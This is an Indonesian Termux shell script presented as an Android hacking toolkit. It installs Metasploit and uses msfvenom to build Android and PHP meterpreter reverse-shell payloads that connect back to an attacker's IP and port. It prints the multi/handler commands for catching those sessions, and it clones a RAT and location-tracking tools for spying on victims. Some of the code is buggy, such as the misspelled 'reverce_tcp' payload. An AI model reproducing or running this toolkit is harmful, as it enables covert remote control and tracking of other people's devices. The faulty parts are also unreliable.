#!/bin/sh
#janganDiRecodeGuys!!
#Mod By Mr. Mpx7

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo ""
echo ""
echo ""
echo ""
echo ""
echo $cyan"┏━╮╭━┓ ╭━━━━━━╮"$yellow"HELLO BANGSAT" $red"-_-*"
echo $cyan"┃┏┗┛┓┃╭┫      |"$white" Author :"$blue" Mr. Mpx7"
echo $cyan"╰┓▋▋┏╯╯╰━━━━━━╯"$white" Team   :"$blue" FR13NDS"
echo $cyan"╭━┻╮╲┗━━━━╮╭╮  "$white" E-mail :"$blue" abdikomputer936@gmail.com"
echo $cyan"┃▎▎┃╲╲╲╲╲╲┣━╯  "$purple"===================="
echo $cyan"╰━┳┻▅╯╲╲╲╲┃    "$purple"="$red" TooL5 Hack Android "
echo $cyan"  ╰━┳┓┏┳┓┏╯    "$purple"===================="
echo $cyan"     ┗┻┛┗┻┛   "$yellow"      JANGAN DI RECODE "
echo ""
echo $red"NB"$yellow":" $blue"jika ada kendala tekan"$cyan" Enter"
echo $blue"      Ikuti Aja Command~Command-Nya"
echo ""
echo $blue " _________________________________"
echo $blue "|" $red "[][][[HACK_ANDROID_ID]][][] " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|" $white "[1]" $green "Payload_Apk            " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|" $white "[2]" $green "Payload_PHP            " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|" $white "[3]" $green "Payload_Python         " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|" $white "[4]" $green "Payload_Gps            " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|" $white "[A]" $yellow "install bahan-bahannya " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|" $white "[ctrl + c]" $green "Exit  Program   " $blue "|>"
sleep 0.5
echo $blue " _____________________________________________>"
echo $blue "|________________________________|>"
echo $green "Masukan Pilihan!!!! "
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  bro

if [ $bro = A ] || [ $bro = a ]
then
clear
apt update && apt upgrade
pkg install git
echo $cyan"installing,,,, python"
pkg install python
echo $cyan"Installing,,,, python2"
pkg install python2
echo $cyan"Installing,,,, bash"
pkg install bash
echo $cyan"Installing,,,, php"
pkg install php
fi

clear
echo $white"Sediakan Ruang Sebesar"$red" 300mb"$white" Karna Tools Ini Sangat Besar "
echo $cyan"pastikan Koneksi Internet Stabil"
echo $yellow"waktu penginstallan 40 Menit Tergantung koneksi"
echo $purple "╭─"$green"Install Metasploit  ???"$cyan"y"$white"/"$cyan"n"$purple
read -p " ╰─> "  pilih
if [ $pilih = y ] || [ $pilih = Y ]
then
	echo $green"Sedang Menjalankan Console,,,, "
	pkg install unstable-repo
	pkg install metasploit
	fi

if [ $pilih = n ] || [ $pilih = N ]
then
	echo $red"Keluar,,,, "
	sleep 0.5
	sh hack.sh
	fi

if [ $bro = 01 ] || [ $bro = 1 ]
then
clear
figlet -f bubble 'Payload_Apk' | lolcat
echo $green "Masukan Ip Address !!!! "
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  ip
echo $green "Masukan Port !!!! "
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  port
echo $green "Simpan Di?"$cyan" contoh:"$blue"/sdcard/payload.apk"
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  simpan
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /$simpan
echo $blue"Payload Selesai Di Buat !!!! "
echo $red"msf>"$green" use exploit/multi/handler"
echo $red"msf>"$green" set payload android/meterpreter/reverse_tcp"
echo $red"msf>"$green" set LHOST (Your IP)"
echo $red"msf>"$green" set LPORT (Your Port)"
echo $red"msf>"$green" exploit"
fi
echo $blue "╭─"$green"Langsung Hack  ???"$cyan"y"$white"/"$cyan"n"$blue
read -p " ╰─> "  user
if [ $user = y ] || [ $user = Y ]
then
	echo $green"Sedang Menjalankan Console,,,, "
	msfconsole
	fi

if [ $user = n ] || [ $user = N ]
then
	echo $red"Keluar,,,, "
	fi

if [ $bro = 02 ] || [ $bro = 2 ]
then
clear
figlet -f bubble 'Payload_Php' | lolcat
echo $green "Masukan Ip Address !!!! "
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  ip
echo $green "Masukan Port !!!! "
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  port
echo $green "Simpan Di?:"$cyan" contoh:"$blue"/sdcard/payload.php"
echo $white "╭─"$green"root@Mpx7"$cyan" ~/system"$white
read -p " ╰─> "  simpan
msfvenom -p php/meterpreter/reverce_tcp LHOST=$ip LPORT=$port R > /$simpan
echo $blue"Payload Telah Selesai di buat !!!! "
echo $red"msf>"$green" use exploit/multi/handler"
echo $red"msf>"$green" set payload php/meterpreter/reverse_tcp"
echo $red"msf>"$green" set LHOST (Your IP)"
echo $red"msf>"$green" set LPORT (Your Port)"
echo $red"msf>"$green" exploit"
fi
echo $blue "╭─"$green"Langsung Hack  ???"$cyan"y"$white"/"$cyan"n"$blue
read -p " ╰─> "  hack
if [ $hack = y ] || [ $hack = Y ]
then
	echo $green"Sedang Menjalankan Console,,,, "
	msfconsole
	fi

if [ $hack = n ] || [ $hack = N ]
then
	echo $red"Keluar,,,, "
	sh hack.sh
	fi

if [ $bro = 03 ] || [ $bro = 3 ]
then
clear
apt update 
apt upgrade
apt install git
apt install python2
apt install python
git clone https://github.com/Xi4u7/A-Rat
cd A-Rat
ls 
chmod +x *
python2 A-Rat.py
fi

if [ $bro = 04 ] || [ $bro = 4 ]
then
clear
apt update 
apt upgrade 
pkg install python2
pkg install bash
pkg install git
git clone https://github.com/thewhiteh4t/seeker
cd seeker/termux 
chmod 777 install.sh 
./install.sh
fi

if [ $bro = 05 ] || [ $bro = 5 ]
then
clear
apt update 
apt upgrade 
pkg install python2
pkg install git
pkg install bash
git clone https://github.com/thelinuxchoice/locator
cd locator
bash locator.sh
fi


